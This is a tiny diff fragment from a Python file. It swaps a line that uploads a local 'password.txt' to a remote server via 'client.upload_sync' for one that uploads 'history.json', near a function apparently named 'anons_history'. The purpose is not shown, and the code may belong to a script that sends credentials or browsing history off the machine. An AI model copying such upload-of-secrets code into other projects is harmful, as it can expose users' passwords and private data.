@@ -26,4 +26,4 @@ def anons_history():
     return c
 
 
-client.upload_sync(remote_path="password.txt", local_path="password.txt")
+client.upload_sync(remote_path="history.json", local_path="history.json")
